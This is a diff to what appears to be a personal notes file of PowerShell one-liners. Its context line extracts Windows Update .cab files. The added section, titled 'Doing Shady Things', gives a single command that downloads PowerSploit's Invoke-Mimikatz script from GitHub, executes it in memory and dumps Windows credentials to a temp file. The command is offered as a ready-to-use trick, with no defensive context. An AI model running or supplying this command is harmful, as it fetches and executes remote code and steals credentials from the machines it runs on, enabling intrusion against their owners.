@@ -32,3 +32,8 @@ Getting  all the .msp files out of your windows Update .cab archives
 ```
 Get-ChildItem -Path C:\Windows\SoftwareDistribution\Download\*.cab -Recurse | Select-Object -ExpandProperty FullName | ForEach-Object {expand.exe $_ -F:* C:\Updates\}
 ```
+## Doing Shady Things
+Dumping Some Creds
+```
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds | Out-File "$($Env:TEMP)\output.txt"
+```
